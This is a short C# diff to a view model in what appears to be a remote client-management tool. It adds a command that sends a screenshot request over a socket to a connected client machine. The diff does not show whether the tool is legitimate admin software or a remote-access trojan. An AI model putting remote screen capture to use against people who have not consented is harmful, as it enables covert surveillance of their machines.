@@ -16,11 +16,23 @@
 
         public ClientViewModel(ClientSocket clientSocket)
         {
-            this.CmdDisconnect = new CommandHandler(() => Disconnect(), this.CanDisconnect());
+            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot());
+            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect());
             this.clientSocket = clientSocket;
             this.Id = clientSocket.Id;
         }
 
+        private bool CanScreenshot()
+        {
+            return true;
+        }
+
+        private void Screenshot()
+        {
+            this.clientSocket.SendObject(1111, 40L);
+        }
+
+        public ICommand CmdScreenshot { get; set; }
         public ICommand CmdDisconnect { get; set; }
         public int Id { get { return this.id; } set { this.id = value; NotifyPropertyChanged("Id"); } }
         public ComputerInfo ComputerInfo { get { return this.computerInfo; } set { this.computerInfo = value; NotifyPropertyChanged("ComputerInfo"); } }
